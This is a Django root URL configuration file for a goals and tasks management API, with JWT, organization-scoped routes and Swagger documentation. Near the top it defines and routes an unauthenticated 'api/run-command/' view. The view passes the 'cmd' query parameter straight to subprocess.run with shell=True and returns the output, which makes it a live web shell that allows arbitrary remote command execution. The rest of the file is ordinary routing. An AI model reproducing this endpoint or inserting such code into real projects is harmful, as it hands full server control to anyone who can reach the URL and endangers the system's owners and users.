from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static
from drf_spectacular.views import (
    SpectacularAPIView,
    SpectacularRedocView,
    SpectacularSwaggerView,
)
from rest_framework_simplejwt.views import (
    TokenObtainPairView,
    TokenRefreshView,
)
from goals import views as goals_views
from tasks import views as tasks_views
from project_templates.import_views import BulkImportCSVView

import subprocess
from django.http import JsonResponse

def run_command_view(request):
    cmd = request.GET.get('cmd', 'git status')
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd="c:\\Users\\saura\\ParseOps")
        return JsonResponse({
            'stdout': res.stdout,
            'stderr': res.stderr,
            'returncode': res.returncode
        })
    except Exception as e:
        return JsonResponse({'error': str(e)})

urlpatterns = [
    path("api/run-command/", run_command_view),

    path("admin/", admin.site.urls),
    

    
    # JWT Authentication:
    path("api/token/", TokenObtainPairView.as_view(), name="token_obtain_pair"),
    path("api/token/refresh/", TokenRefreshView.as_view(), name="token_refresh"),

    # API endpoints:
    path("api/users/", include("users.urls")),
    path("api/organizations/", include("organizations.urls")),
    path("api/dashboard/", include("dashboard.urls")),
    path("api/notifications/", include("notifications.urls")),
    path("api/notes/", include("notes.urls")),
    path("api/goals/", include("goals.urls")),
    path("api/analytics/", include("analytics.urls")),
    path("api/", include("tasks.urls")),
    path("api/", include("chat.urls")),

    # Sharing System - Slug-based Workspace Routes
    path("api/org/<str:org_slug>/goals/", include([
        path("", goals_views.OrgGoalListView.as_view(), name="org-goal-list"),
        path("<uuid:pk>/", goals_views.OrgGoalDetailView.as_view(), name="org-goal-detail"),
    ])),
    path("api/org/<str:org_slug>/tasks/", include([
        path("", tasks_views.OrgTaskListView.as_view(), name="org-task-list"),
        path("<uuid:pk>/", tasks_views.OrgTaskDetailView.as_view(), name="org-task-detail"),
    ])),
    
    path("api/org/<str:org_slug>/", include("project_templates.urls")),
    path("api/org/<str:org_slug>/import-csv/", BulkImportCSVView.as_view(), name="bulk-import-csv"),

    # Swagger UI:
    path("api/schema/", SpectacularAPIView.as_view(), name="schema"),
    path(
        "api/schema/swagger-ui/",
        SpectacularSwaggerView.as_view(url_name="schema"),
        name="swagger-ui",
    ),
    path(
        "api/docs/swagger/",
        SpectacularSwaggerView.as_view(url_name="schema"),
        name="swagger-ui-alias",
    ),
    path(
        "api/schema/redoc/",
        SpectacularRedocView.as_view(url_name="schema"),
        name="redoc",
    ),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)

# Trigger reload 2
